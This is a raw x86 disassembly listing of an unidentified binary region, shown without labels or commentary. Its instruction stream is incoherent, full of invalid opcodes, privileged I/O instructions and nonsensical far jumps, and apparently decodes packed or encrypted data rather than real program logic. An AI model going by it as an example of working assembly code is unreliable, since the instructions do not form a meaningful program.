  40be4e:	retf   0x21b7
  40be51:	pop    es
  40be52:	retf   0x12f5
  40be55:	pop    es
  40be56:	sub    ebx,DWORD PTR [ebx-0xd]
  40be59:	sub    dh,BYTE PTR [edi+ecx*8+0x1a7b3ddd]
  40be60:	js     0x40be8d
  40be62:	sbb    ebp,DWORD PTR [edi-0x6ee92324]
  40be68:	lahf   
  40be69:	jae    0x40be8a
  40be6b:	sbb    eax,0x1bdd5dfa
  40be70:	cmp    ah,BYTE PTR [edi-0x6b]
  40be73:	xchg   bx,ax
  40be75:	loope  0x40bedf
  40be77:	retf   0xd722
  40be7a:	inc    ebx
  40be7c:	add    dh,BYTE PTR [ecx]
  40be7e:	int    0x2c
  40be80:	int    0xeb
  40be82:	outs   dx,BYTE PTR ds:[esi]
  40be83:	loopne 0x40be0f
  40be85:	(bad)  
  40be86:	nop
  40be87:	cmp    DWORD PTR [ebp+0x2b60159e],0x2b50b9c7
  40be91:	neg    cl
  40be93:	mov    bh,0x39
  40be95:	adc    esp,ebx
  40be97:	xchg   esi,eax
  40be98:	pop    ecx
  40be99:	mov    DWORD PTR [esi+0x53],edi
  40be9c:	mov    ss,WORD PTR [eax]
  40be9e:	test   eax,0x63a305ba
  40bea3:	mov    ch,BYTE PTR ds:[esi]
  40bea6:	in     al,0xd2
  40bea8:	into   
  40bea9:	ud2    
  40beab:	in     eax,0xf
  40bead:	add    eax,0xa7b1df37
  40beb2:	sub    DWORD PTR [esi-0x5f],eax
  40beb5:	xor    ebp,DWORD PTR [esi-0x6]
  40beb8:	cwde   
  40beb9:	into   
  40beba:	retf   
  40bebb:	inc    ebp
  40bebc:	pushf  
  40bebd:	aas    
  40bebe:	js     0x40be4a
  40bec0:	je     0x40bf26
  40bec2:	adc    BYTE PTR [ebp-0x64dd7fcf],bh
  40bec8:	xchg   BYTE PTR [edx],al
  40beca:	mov    al,0x5c
  40becc:	ss das 
  40bece:	aam    0x74
  40bed0:	(bad)  
  40bed1:	xlat   BYTE PTR ds:[ebx]
  40bed2:	xlat   BYTE PTR ds:[ebx]
  40bed3:	xchg   ecx,eax
  40bed4:	call   0xe0b:0xeb8b99f5
  40bedb:	xchg   esi,eax
  40bedc:	je     0x40beff
  40bede:	out    0xbd,eax
  40bee0:	adc    ah,BYTE PTR [edi]
  40bee2:	push   eax
  40bee3:	cmp    al,0x3f
  40bee5:	fstp   st(6)
  40bee7:	inc    esp
  40bee8:	int3   
  40bee9:	xor    DWORD PTR [ecx-0x3b],esp
  40beec:	lock xacquire add BYTE PTR [ebx+0xc],bl
  40bef1:	or     al,0xa1
  40bef3:	cld    
  40bef4:	jae    0x40beb4
  40bef6:	mov    ch,0xde
  40bef8:	inc    edx
  40bef9:	pop    eax
  40befa:	pop    eax
  40befb:	or     esp,DWORD PTR [esi+0x57]
  40befe:	inc    ebx
  40beff:	inc    edx
  40bf00:	xchg   edi,eax
  40bf01:	out    dx,eax
  40bf02:	popf   
  40bf03:	std    
  40bf04:	aaa    
  40bf05:	push   esi
  40bf06:	clc    
  40bf07:	dec    edi
  40bf08:	xchg   esp,eax
  40bf09:	ss mov al,0x9d
  40bf0c:	push   ds
  40bf0d:	test   eax,0xd21b3002
  40bf12:	xchg   ebx,eax
  40bf13:	xchg   edi,eax
  40bf14:	retf   0x1297
  40bf17:	jle    0x40bf57
  40bf19:	rcr    esi,1
  40bf1b:	push   0xffffffdc
  40bf1d:	call   0x5ea2:0xd77aed9b
  40bf24:	jmp    0x40bf02
  40bf26:	sub    DWORD PTR [edi],eax
  40bf28:	jae    0x40bf18
  40bf2a:	shl    BYTE PTR [edx-0x5992893d],1
  40bf30:	fisubr WORD PTR cs:[esi+0x3]
  40bf34:	hlt    
  40bf35:	cli    
  40bf36:	inc    esp
  40bf37:	(bad)  
  40bf38:	push   edi
  40bf39:	sbb    DWORD PTR [edi-0x39321fef],esp
  40bf3f:	pop    esp
  40bf40:	xor    BYTE PTR [edi+0x36],0x9
  40bf44:	in     al,dx
  40bf45:	add    ecx,0xfffffff2
  40bf48:	mov    BYTE PTR [esi-0x3e743c7b],al
  40bf4e:	cli    
  40bf4f:	cmc    
  40bf50:	fucomp st(7)
  40bf52:	mov    edx,es
  40bf54:	push   0x3526cb11
  40bf59:	mov    WORD PTR [eax],?
  40bf5b:	mov    ah,0x13
  40bf5d:	ret    
  40bf5e:	outs   dx,DWORD PTR ds:[esi]
  40bf5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf60:	iret   
  40bf61:	mov    ds,WORD PTR [esi+0x3f53cbcf]
  40bf67:	loop   0x40befd
  40bf69:	lds    edx,FWORD PTR [esi+0x12]
  40bf6c:	mov    esi,0x8f7b7cf8
  40bf71:	push   ss
  40bf72:	mov    ?,WORD PTR [esi-0x29]
  40bf75:	scas   al,BYTE PTR es:[edi]
  40bf76:	outs   dx,DWORD PTR ds:[esi]
  40bf77:	or     esi,DWORD PTR [esi+0x77ce4498]
  40bf7d:	clc    
  40bf7e:	sbb    esp,DWORD PTR [ebp-0x4a]
  40bf81:	inc    ebp
  40bf82:	in     al,0x55
  40bf84:	sti    
  40bf85:	pop    edx
  40bf86:	repnz call 0x8052:0xe4caf171
  40bf8e:	inc    ebx
  40bf8f:	pop    eax
  40bf90:	or     al,0x62
  40bf92:	xlat   BYTE PTR ds:[ebx]
  40bf93:	and    DWORD PTR [esi+0x2f7df222],0xdc995d3f
  40bf9d:	push   edi
  40bf9e:	and    BYTE PTR [esp+eax*4],0x31
  40bfa2:	add    BYTE PTR [eax-0x647fd8e],bh
  40bfa8:	and    al,BYTE PTR [ecx+ecx*4]
  40bfab:	xchg   esi,eax
  40bfac:	xchg   edx,eax
  40bfad:	shl    bl,1
  40bfaf:	pop    edx
  40bfb0:	ret    0xa86d
  40bfb3:	dec    eax
  40bfb4:	push   ecx
  40bfb5:	push   ebx
  40bfb6:	(bad)  
  40bfb7:	jp     0x40bfb1
  40bfb9:	sahf   
  40bfba:	pop    esp
  40bfbb:	enter  0xa5b3,0xb0
  40bfbf:	loop   0x40c025
  40bfc1:	loopne 0x40bf64
  40bfc3:	(bad)  
  40bfc4:	pop    ecx
  40bfc5:	sar    BYTE PTR [edi+0x3932e76f],0xde
  40bfcc:	dec    edi
  40bfcd:	mov    ebx,0xeef8528c
  40bfd2:	jl     0x40bf97
  40bfd4:	add    DWORD PTR [ecx+0xf],ebx
  40bfd7:	xlat   BYTE PTR ds:[ebx]
  40bfd8:	jmp    0x40bf84
  40bfda:	iret   
  40bfdb:	and    al,0xce
  40bfdd:	cmp    dh,BYTE PTR [esi-0xcef92e5]
  40bfe3:	cs or  ebp,edi
  40bfe6:	int    0x5a
  40bfe8:	je     0x40bfe1
  40bfea:	dec    edi
  40bfeb:	xlat   BYTE PTR ds:[ebx]
  40bfec:	pop    eax
  40bfed:	and    edx,esp
  40bfef:	mov    WORD PTR [ebp-0x1d],cs
  40bff2:	pusha  
  40bff3:	loopne 0x40bfdf
  40bff5:	dec    edi
  40bff6:	cmp    esp,DWORD PTR [eax-0x5060998e]
  40bffc:	or     eax,0x2860e66a
  40c001:	das    
  40c002:	imul   esp,DWORD PTR ds:0xec9c2324,0x1b
  40c009:	in     eax,0x4
  40c00b:	pusha  
  40c00c:	pop    es
  40c00d:	fstp   DWORD PTR [edi+eax*2]
  40c010:	pop    es
  40c011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c012:	cmp    bl,BYTE PTR [esi]
  40c014:	test   eax,0xf873f282
  40c019:	cmp    edx,DWORD PTR [esi+0x15f36b77]
  40c01f:	(bad)  
  40c020:	leave  
  40c021:	outs   dx,DWORD PTR ds:[esi]
  40c022:	sub    DWORD PTR [ebp-0x5a0cc49],esi
  40c028:	mov    esi,0x18a52539
  40c02d:	mul    DWORD PTR [ebx+0xc2bd519]
  40c033:	sbb    BYTE PTR [edx-0x3fb50d59],bl
  40c039:	outs   dx,DWORD PTR ds:[esi]
  40c03a:	cdq    
  40c03b:	adc    BYTE PTR [eax-0x42],0xb2
  40c03f:	sub    eax,0xfc0644b5
  40c044:	inc    ecx
  40c045:	in     al,dx
  40c046:	cs dec esp
  40c048:	clc    
  40c049:	arpl   WORD PTR [eax-0x7e],cx
  40c04c:	mov    ds:0x8a90c512,al
  40c051:	loop   0x40bfee
  40c053:	jnp    0x40c032
  40c055:	mov    DWORD PTR ds:[eax+0x3c23de6c],ebp
  40c05c:	inc    ecx
  40c05d:	fwait
  40c05e:	add    dh,0x12
  40c061:	pop    ebx
  40c062:	sub    ch,BYTE PTR [edx]
  40c064:	add    al,0x1a
  40c066:	sub    al,0x38
  40c068:	xchg   ebp,eax
  40c069:	sub    BYTE PTR [ebx+0xdd8937b],ah
  40c06f:	xchg   ebx,eax
  40c070:	dec    ebx
  40c071:	inc    eax
  40c072:	push   ecx
  40c073:	fbstp  TBYTE PTR [ecx-0x9]
  40c076:	adc    al,0x80
  40c078:	push   ss
  40c079:	jno    0x40bffe
  40c07b:	dec    ebx
  40c07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c07d:	add    BYTE PTR [ecx],bl
  40c07f:	loopne 0x40c0ac
  40c081:	and    eax,0xa3a4c1a3
  40c086:	jno    0x40c06f
  40c088:	ss call 0x6585b762
  40c08e:	dec    esi
  40c08f:	sub    DWORD PTR [eax],eax
  40c091:	adc    esp,DWORD PTR [esp+ebp*4]
  40c094:	xchg   edi,eax
  40c095:	push   edx
  40c096:	aas    
  40c097:	xchg   esi,ebx
  40c099:	sahf   
  40c09a:	and    eax,0xc7158430
  40c09f:	cdq    
  40c0a0:	pop    ecx
  40c0a1:	and    ecx,DWORD PTR ss:[esi+0x3b]
  40c0a5:	rcl    ecx,cl
  40c0a7:	push   es
  40c0a8:	loope  0x40c02d
  40c0aa:	sub    ch,BYTE PTR [ecx-0x3124cb4d]
  40c0b0:	in     al,dx
  40c0b1:	imul   ecx,DWORD PTR [ebx-0x41],0x79a425f8
  40c0b8:	pop    edi
  40c0b9:	sti    
  40c0ba:	jg     0x40c0c8
  40c0bc:	inc    esp
  40c0bd:	add    BYTE PTR [ebx+edi*8],dl
  40c0c0:	sbb    eax,0x53d3667b
  40c0c5:	cmp    edi,DWORD PTR [ecx+0xc]
  40c0c8:	fsubr  QWORD PTR [edi-0x3ebe90ab]
  40c0ce:	adc    BYTE PTR [ebx-0x293cb0f6],dl
  40c0d4:	out    0xb8,eax
  40c0d6:	inc    esi
  40c0d7:	arpl   WORD PTR [edi+0x1a],bx
  40c0da:	loope  0x40c141
  40c0dc:	adc    eax,0x9f9afdb0
  40c0e1:	shr    BYTE PTR gs:[ebx-0x22247be6],0xd9
  40c0e9:	jmp    0x49094fc7
  40c0ee:	or     bh,BYTE PTR [edi+0x49]
  40c0f1:	outs   dx,DWORD PTR ds:[esi]
  40c0f2:	and    DWORD PTR [edx-0x245c3b6],0xffffffea
  40c0f9:	mov    eax,ebx
  40c0fb:	idiv   eax
  40c0fd:	jno    0x40c0a9
  40c0ff:	push   esp
  40c100:	mov    BYTE PTR [esi-0x70],ch
  40c103:	cmp    ebp,DWORD PTR [edx]
  40c105:	aad    0x88
  40c107:	or     eax,DWORD PTR [eax+0x5c0f4f50]
  40c10d:	into   
  40c10e:	sar    DWORD PTR ds:0x8b9b2b99,cl
  40c114:	dec    edx
  40c115:	icebp  
  40c116:	jl     0x40c0f4
  40c118:	ret    
  40c119:	cmp    eax,0x8ba4ac78
  40c11e:	ja     0x40c0c2
  40c120:	sub    eax,0x1951de5e
  40c125:	push   edi
  40c126:	out    0xf7,eax
  40c128:	dec    ebx
  40c129:	push   ecx
  40c12a:	jne    0x40c18a
  40c12c:	addr16 out 0x51,al
  40c12f:	cmc    
  40c130:	repnz pushf 
  40c132:	and    DWORD PTR [edx],edx
  40c134:	loopne 0x40c17f
  40c136:	and    al,0xba
  40c138:	leave  
  40c139:	(bad)  
  40c13a:	popa   
  40c13b:	dec    ebx
  40c13c:	xchg   edx,eax
  40c13d:	pop    es
  40c13e:	popa   
  40c13f:	fwait
  40c140:	mov    eax,0xf2fa189a
  40c145:	xchg   ecx,eax
  40c146:	jns    0x40c175
  40c148:	leave  
  40c149:	pushf  
  40c14a:	inc    esp
  40c14b:	cmp    eax,0x32bcfb9c
  40c150:	add    dl,BYTE PTR [edi+0x76]
  40c153:	push   esi
  40c154:	mov    al,ds:0xf2f48585
  40c159:	stos   DWORD PTR es:[edi],eax
  40c15a:	push   esi
  40c15b:	dec    edx
  40c15c:	xor    esp,0x65
  40c15f:	jnp    0x40c17c
  40c161:	out    dx,al
  40c162:	pop    edx
  40c163:	test   BYTE PTR [ebx+0x51],bl
  40c166:	xchg   ecx,eax
  40c167:	jp     0x40c185
  40c169:	loop   0x40c14f
  40c16b:	xor    dl,bl
  40c16d:	in     al,dx
  40c16e:	xchg   DWORD PTR [edi-0x710496e5],edx
  40c174:	jo     0x40c0ff
  40c176:	mov    al,0xfc
  40c178:	bnd jae 0x40c172
  40c17b:	pop    edx
  40c17c:	sbb    al,0xbb
  40c17e:	cmp    DWORD PTR [ecx+0x28],edi
  40c181:	cdq    
  40c182:	in     al,0xf7
  40c184:	push   ebp
  40c185:	int    0x4c
  40c187:	xor    BYTE PTR [edx+0x5],dl
  40c18a:	mov    ebx,edi
  40c18c:	not    DWORD PTR [eax+0x2357c256]
  40c192:	jno    0x40c19d
  40c194:	cmp    eax,0x23c9e171
  40c199:	jbe    0x40c15d
  40c19b:	jno    0x40c21a
  40c19d:	lahf   
  40c19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19f:	xchg   esp,eax
  40c1a0:	loopne 0x40c1e5
  40c1a2:	loop   0x40c21d
  40c1a4:	jns    0x40c187
  40c1a6:	sub    edx,DWORD PTR [edi+0x1cf40651]
  40c1ac:	sbb    ah,al
  40c1ae:	xor    BYTE PTR [edx-0x66],bl
  40c1b1:	dec    ecx
  40c1b2:	sbb    al,0x4
  40c1b4:	cli    
  40c1b5:	into   
  40c1b6:	and    eax,0xdc988743
  40c1bb:	pusha  
  40c1bc:	pop    es
  40c1bd:	xor    edi,eax
  40c1bf:	push   esi
  40c1c0:	xchg   DWORD PTR [edi-0x2a7d971d],esp
  40c1c6:	retf   0xb7a8
  40c1c9:	add    al,BYTE PTR [edi]
  40c1cb:	pop    ss
  40c1cc:	iret   
  40c1cd:	stos   BYTE PTR es:[edi],al
  40c1ce:	dec    ebp
  40c1cf:	stos   DWORD PTR es:[edi],eax
  40c1d0:	clc    
  40c1d1:	or     dh,ch
  40c1d3:	xstore-rng (bad)
  40c1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d5:	pop    es
  40c1d6:	jo     0x40c1f3
  40c1d8:	jg     0x40c166
  40c1da:	mov    ah,0x3d
  40c1dc:	sub    cl,BYTE PTR [edi]
  40c1de:	jmp    0xe6c4:0x4871a96c
  40c1e5:	pop    eax
  40c1e6:	pop    edi
  40c1e7:	mov    dl,0xc0
  40c1e9:	jecxz  0x40c227
  40c1eb:	dec    esi
  40c1ec:	(bad)  
  40c1ed:	retf   0x7567
  40c1f0:	popa   
  40c1f1:	enter  0xe037,0x44
  40c1f5:	push   0x8251cfb2
  40c1fa:	popa   
  40c1fb:	fimul  DWORD PTR [edi]
  40c1fd:	xchg   ebx,eax
  40c1fe:	mov    dl,0x98
  40c200:	mov    al,0x33
  40c202:	shl    BYTE PTR [ebx-0x4979e08a],0x7d
  40c209:	mov    dl,0xcc
  40c20b:	mov    esi,0xb1bfe667
  40c210:	pop    ds
  40c211:	xchg   esi,eax
  40c212:	xor    eax,DWORD PTR [ecx+0x64]
  40c215:	cmp    BYTE PTR [esi+0x5d],0xf1
  40c219:	js     0x40c205
  40c21b:	imul   eax,DWORD PTR [ebx-0x19e713eb],0x7509e5bc
  40c225:	mov    ah,0x92
  40c227:	shl    DWORD PTR [ebp-0x2e211],cl
  40c22d:	mov    WORD PTR ds:0xad6884a3,cs
  40c233:	lock and eax,DWORD PTR [edx]
  40c236:	mov    ecx,0x316aa031
  40c23b:	aad    0x15
  40c23d:	adc    ebx,DWORD PTR [ebp+0x4681235]
  40c243:	outs   dx,BYTE PTR ds:[esi]
  40c244:	sar    DWORD PTR [eax+0x21],cl
  40c247:	(bad)  
  40c248:	enter  0x1994,0xa0
  40c24c:	and    al,0x8f
  40c24e:	mov    cl,0x3e
  40c250:	out    dx,eax
  40c251:	mov    DWORD PTR [esi],ebp
  40c253:	int3   
  40c254:	add    eax,0x5e78f987
  40c259:	pushf  
  40c25a:	xor    dh,BYTE PTR [ebx+0x5255ed21]
  40c260:	fs retf 
  40c262:	dec    ecx
  40c263:	or     al,BYTE PTR [esi]
  40c265:	mov    ch,0xf8
  40c267:	xor    al,0x70
  40c269:	dec    eax
  40c26a:	inc    ebx
  40c26b:	arpl   WORD PTR [eax+0x3b],bp
  40c26e:	xchg   ecx,eax
  40c26f:	push   ebx
  40c270:	push   edi
  40c271:	popf   
  40c272:	aas    
  40c273:	ret    0xf255
  40c276:	dec    edi
  40c277:	or     dh,bh
  40c279:	xlat   BYTE PTR ds:[ebx]
  40c27a:	and    BYTE PTR [eax+eax*2+0x51150044],dh
  40c281:	add    eax,0x6fd81a46
  40c286:	xchg   dl,dl
  40c288:	cli    
  40c289:	mov    edx,0x7e6f1812
  40c28e:	jl     0x40c241
  40c290:	cld    
  40c291:	hlt    
  40c292:	jecxz  0x40c27e
  40c294:	cmp    al,0x6b
  40c296:	stos   DWORD PTR es:[edi],eax
  40c297:	dec    edx
  40c298:	push   esi
  40c299:	mov    ch,0xfa
  40c29b:	sbb    BYTE PTR [edx],bh
  40c29d:	fistp  QWORD PTR [edx+esi*1]
  40c2a0:	mov    WORD PTR [esp+ecx*1-0x27],ds
  40c2a4:	mov    ebx,0x1a45a564
  40c2a9:	cmp    DWORD PTR [ecx+0x4b8f4b29],edx
  40c2af:	xor    ecx,ebx
  40c2b1:	mov    ch,0x6a
  40c2b3:	push   edx
  40c2b4:	adc    al,0xe1
  40c2b6:	mov    dh,0xf1
  40c2b8:	push   ds
  40c2b9:	or     ebx,esp
  40c2bb:	jne    0x40c29f
  40c2bd:	test   eax,0x4b46e776
  40c2c2:	int3   
  40c2c3:	mov    al,ds:0xb249f983
  40c2c8:	mov    ds:0xd7b6c43a,eax
  40c2cd:	ins    DWORD PTR es:[edi],dx
  40c2ce:	mov    bh,0xa
  40c2d0:	addr16 inc edx
  40c2d2:	push   ds
  40c2d3:	in     eax,0x6c
  40c2d5:	push   es
  40c2d6:	loopne 0x40c2e2
  40c2d8:	dec    esi
  40c2d9:	dec    esi
  40c2da:	popf   
  40c2db:	mov    ebx,0xed073a86
  40c2e0:	jmp    0xae6fcb0f
  40c2e5:	test   BYTE PTR [eax+edi*2],0x1b
  40c2e9:	cmp    DWORD PTR [esi+0x26],0xffffffba
  40c2ed:	mov    edx,0x7eecd72d
  40c2f2:	es jne 0x40c363
  40c2f5:	fistp  QWORD PTR [ebp+0x2bfeee6a]
  40c2fb:	push   es
  40c2fc:	int    0xde
  40c2fe:	add    DWORD PTR [ebp-0x3b],0x4fa8452b
  40c305:	jns    0x40c34d
  40c307:	out    dx,eax
  40c308:	xchg   ebx,eax
  40c309:	jmp    0x3fe4:0xdc310e81
  40c310:	je     0x40c2bd
  40c312:	mov    WORD PTR [edi-0x5c],?
  40c315:	fidivr DWORD PTR [eax]
  40c317:	cmp    cl,dl
  40c319:	aam    0x43
  40c31b:	icebp  
  40c31c:	loope  0x40c391
  40c31e:	ret    0xf2ea
  40c321:	jbe    0x40c377
  40c323:	jo     0x40c2ee
  40c325:	mov    BYTE PTR [ecx],ch
  40c327:	inc    esi
  40c328:	jnp    0x40c354
  40c32a:	fcom   QWORD PTR [ebx+0x34c79d8b]
  40c330:	dec    edi
  40c331:	mov    edi,0xd1ef0128
  40c336:	stc    
  40c337:	stc    
  40c338:	jge    0x40c2c2
  40c33a:	test   DWORD PTR [esi-0x72],ecx
  40c33d:	inc    eax
  40c33e:	cdq    
  40c33f:	inc    esp
  40c340:	mov    eax,ds:0x2b846a79
  40c345:	cmp    bl,BYTE PTR [ebp+0x22fbc075]
  40c34b:	mov    eax,0x65be5953
  40c350:	push   ebp
  40c351:	pop    eax
  40c352:	mov    dh,0x78
  40c354:	mov    edi,0x40c2b5e2
  40c359:	out    0x22,eax
  40c35b:	mov    cl,0xcb
  40c35d:	sub    esp,0x4ea072a1
  40c363:	lds    ebp,FWORD PTR [eax]
  40c365:	fdivrp st(2),st
  40c367:	bound  eax,QWORD PTR ds:0xdd57e2e1
  40c36d:	push   esp
  40c36e:	test   al,0xda
  40c370:	loop   0x40c35e
  40c372:	mov    al,BYTE PTR [eax]
  40c374:	adc    eax,0x267cd963
  40c379:	(bad)  
  40c37a:	push   cs
  40c37b:	pop    edx
  40c37c:	shl    BYTE PTR [edx+0x38cf3d55],0xe1
  40c383:	test   al,0x1
  40c385:	adc    DWORD PTR [edx-0x1fccd297],0x8b9ca104
  40c38f:	xor    DWORD PTR [esi+0x21],ebp
  40c392:	scas   al,BYTE PTR es:[edi]
  40c393:	adc    eax,0x2fdbe9fc
  40c398:	adc    dh,BYTE PTR [edi-0x4c971da2]
  40c39e:	sar    BYTE PTR [ecx],cl
  40c3a0:	push   ebx
  40c3a1:	jno    0x40c393
  40c3a3:	jbe    0x40c33b
  40c3a5:	out    0x96,eax
  40c3a7:	cld    
  40c3a8:	xchg   edi,eax
  40c3a9:	nop
  40c3aa:	mov    al,0xa3
  40c3ac:	nop
  40c3ad:	push   esi
  40c3ae:	xor    ah,BYTE PTR [edi+0x118561f7]
  40c3b4:	pop    ss
  40c3b5:	jne    0x40c412
  40c3b7:	cmp    DWORD PTR [edx+ebp*8-0x67],edx
  40c3bb:	pop    edx
  40c3bc:	xchg   ecx,eax
  40c3be:	mov    ebp,0xd7b5394a
  40c3c3:	addr16 aam 0xc7
  40c3c6:	add    al,0x3d
  40c3c8:	into   
  40c3c9:	pop    eax
  40c3ca:	sahf   
  40c3cb:	popf   
  40c3cc:	shr    DWORD PTR [edx],1
  40c3ce:	iret   
  40c3cf:	mov    al,dl
  40c3d1:	mov    DWORD PTR [ebx],edx
  40c3d3:	ror    DWORD PTR [ecx+0x7b],cl
  40c3d6:	imul   ecx,DWORD PTR fs:[edx],0x9cbf92eb
  40c3dd:	mov    ch,0x45
  40c3df:	pop    ebp
  40c3e0:	mov    eax,ds:0x998655f1
  40c3e5:	sub    eax,0xaa205440
  40c3ea:	push   0x7853a313
  40c3ef:	retf   0x2dd1
  40c3f2:	dec    eax
  40c3f3:	mov    ebx,0x41165eb2
  40c3f8:	rcl    cl,0xb8
  40c3fb:	push   es
  40c3fc:	push   ebp
  40c3fd:	jae    0x40c3b9
  40c3ff:	out    dx,eax
  40c400:	push   0x7b5e90c6
  40c405:	adc    ch,BYTE PTR [esp+eiz*8-0x36]
  40c409:	inc    esp
  40c40a:	sub    al,0x30
  40c40c:	dec    ebx
  40c40d:	shl    BYTE PTR [ecx+0x199eb257],0x89
  40c414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c415:	fsubr  st,st(1)
  40c417:	cmp    DWORD PTR [edi-0x5036d8ce],esi
  40c41d:	jmp    0xa8b3:0x99f6889b
  40c424:	mov    esp,0x817ee1e6
  40c429:	mov    ebx,0x9d251dba
  40c42e:	pop    ecx
  40c42f:	and    DWORD PTR [edx-0x4de23df3],edi
  40c435:	and    dh,al
  40c437:	sbb    cl,bl
  40c439:	dec    edx
  40c43a:	clflush BYTE PTR [eax+0x53399e05]
  40c441:	adc    cl,BYTE PTR [eax-0x36]
  40c444:	push   ebx
  40c445:	cmp    DWORD PTR [edx],0x669ccc14
  40c44b:	and    DWORD PTR [esi-0x18],ebx
  40c44e:	dec    eax
  40c44f:	lods   eax,DWORD PTR ds:[esi]
  40c450:	push   esi
  40c451:	mov    ds:0x4c26376b,eax
  40c456:	enter  0xf424,0x4c
  40c45a:	xchg   ebx,eax
  40c45b:	jae    0x40c434
  40c45d:	mov    ebx,0xd2db7946
  40c462:	jmp    DWORD PTR [edi]
  40c464:	hlt    
  40c465:	adc    ch,ah
  40c467:	lods   eax,DWORD PTR ds:[esi]
  40c468:	mov    cl,0xd1
  40c46a:	push   es
  40c46b:	or     ebp,DWORD PTR [esi+ecx*2+0x20]
  40c46f:	dec    esp
  40c470:	add    DWORD PTR [edx],edx
  40c472:	xchg   esp,eax
  40c473:	push   ecx
  40c474:	adc    esp,DWORD PTR [edx+0xf5c11c9]
  40c47a:	sbb    DWORD PTR ds:0x921ba603,edx
  40c480:	pop    ebp
  40c481:	in     al,dx
  40c482:	push   edi
  40c483:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c485:	stos   BYTE PTR es:[edi],al
  40c486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c488:	retf   
  40c489:	sbb    eax,0x88ff4601
  40c48e:	xchg   edi,eax
  40c48f:	nop
  40c490:	idiv   BYTE PTR [ebx+ecx*1-0x5c8cc2c6]
  40c497:	mov    al,ds:0x8ec8cc28
  40c49c:	sbb    ebp,ebx
  40c49e:	adc    ebp,ebx
  40c4a0:	push   eax
  40c4a1:	(bad)  
  40c4a2:	int3   
  40c4a3:	sahf   
  40c4a4:	pop    ecx
  40c4a5:	jmp    0xfb38:0x310eaa3a
  40c4ac:	xor    eax,0xc1efff8
  40c4b1:	xchg   BYTE PTR [edi],al
  40c4b3:	cmp    ebx,edi
  40c4b5:	dec    ecx
  40c4b6:	mov    dh,BYTE PTR [eax+edx*4+0x3a69cf57]
  40c4bd:	rol    BYTE PTR [ebx+0x0],1
  40c4c0:	mov    ecx,DWORD PTR [eax]
  40c4c2:	xchg   esp,eax
  40c4c3:	imul   DWORD PTR [ecx+0x71]
  40c4c6:	arpl   WORD PTR [ebx],ax
  40c4c8:	test   edx,esi
  40c4ca:	sub    eax,0x14eb2596
  40c4cf:	call   0x78a2:0x28f6ed25
  40c4d6:	sub    eax,0x1e5646cf
  40c4db:	and    dh,al
  40c4dd:	arpl   WORD PTR [ebx],dx
  40c4df:	sbb    al,0x9
  40c4e1:	xor    eax,0xc0398a2a
  40c4e6:	shr    DWORD PTR es:[eax],0x10
  40c4ea:	mov    bl,0xab
  40c4ec:	inc    edx
  40c4ed:	mov    bh,0xcb
  40c4ef:	sub    DWORD PTR [edi],ebp
  40c4f1:	mov    es,WORD PTR [ebx+0x5790e5a6]
  40c4f7:	xor    esi,DWORD PTR [ebp+ebp*2+0x5a]
  40c4fb:	push   ds
  40c4fc:	imul   esp,ebx,0x27
  40c4ff:	pusha  
  40c500:	push   ebx
  40c501:	in     eax,0xb9
  40c503:	sbb    DWORD PTR [edi-0x596b4025],ecx
  40c509:	and    eax,0x4ca46dab
  40c50e:	rcl    BYTE PTR [esi+eiz*8],1
  40c511:	les    edi,FWORD PTR [eax+0x6dafac15]
  40c517:	jns    0x40c583
  40c519:	and    esi,DWORD PTR [eax]
  40c51b:	lods   eax,DWORD PTR ds:[esi]
  40c51c:	(bad)  
  40c51d:	repnz inc edx
  40c51f:	xor    DWORD PTR [edx-0x7374d1db],ecx
  40c525:	dec    edx
  40c526:	lods   eax,DWORD PTR ds:[esi]
  40c527:	mov    dl,0x4b
  40c529:	xchg   esp,eax
  40c52a:	sbb    eax,0x63d1b4e8
  40c52f:	mov    ecx,0x4e60e540
  40c534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c535:	adc    edi,DWORD PTR [ebx-0x77642e49]
  40c53b:	dec    esi
  40c53c:	jge    0x40c4c5
  40c53e:	xchg   ecx,eax
  40c53f:	sar    BYTE PTR [esi-0x745600ca],1
  40c545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c546:	push   es
  40c547:	pop    edx
  40c548:	ds inc edx
  40c54a:	add    al,0x8c
  40c54c:	jnp    0x40c5b5
  40c54e:	add    edx,esi
  40c550:	push   DWORD PTR [ebx]
  40c552:	(bad)  
  40c553:	mov    ebp,0x44fc2094
  40c558:	in     al,dx
  40c559:	cli    
  40c55a:	mov    ebx,0xcd3caedb
  40c55f:	gs push ds
  40c561:	clc    
  40c562:	setns  dl
  40c565:	sbb    BYTE PTR [ecx-0x651a40b8],bl
  40c56b:	cld    
  40c56c:	sbb    eax,0x6255c614
  40c571:	cs mov bl,0x77
  40c574:	push   edi
  40c575:	inc    esi
  40c576:	int    0xee
  40c578:	std    
  40c579:	sbb    bl,BYTE PTR [esi+eax*2-0x746ad40]
  40c580:	daa    
  40c581:	(bad)  [edx]
  40c583:	cli    
  40c584:	xor    eax,DWORD PTR ds:0x736906f0
  40c58a:	shr    DWORD PTR [edi-0x4c],0x67
  40c58e:	xor    dh,BYTE PTR [ebx-0x61]
  40c591:	sub    DWORD PTR [eax+0x62],edx
  40c594:	outs   dx,BYTE PTR ds:[esi]
  40c595:	(bad)  
  40c596:	xor    DWORD PTR [edx+0x25],esi
  40c599:	pop    esp
  40c59a:	not    eax
  40c59c:	ins    DWORD PTR es:[edi],dx
  40c59d:	sti    
  40c59e:	stos   DWORD PTR es:[edi],eax
  40c59f:	and    eax,0x5984ddc
  40c5a4:	ret    0xf5c8
  40c5a7:	jbe    0x40c565
  40c5a9:	icebp  
  40c5aa:	cmc    
  40c5ab:	jle    0x40c55d
  40c5ad:	fsubr  DWORD PTR ds:0x733473e1
  40c5b3:	imul   esi,eax,0xffffffd4
  40c5b6:	fldenv [eax+edx*2-0x68]
  40c5ba:	cmp    eax,0x9912158a
  40c5bf:	mov    dl,0x71
  40c5c1:	scas   eax,DWORD PTR es:[edi]
  40c5c2:	pop    ds
  40c5c3:	mov    DWORD PTR [ebx+eax*8+0x3243c237],ebx
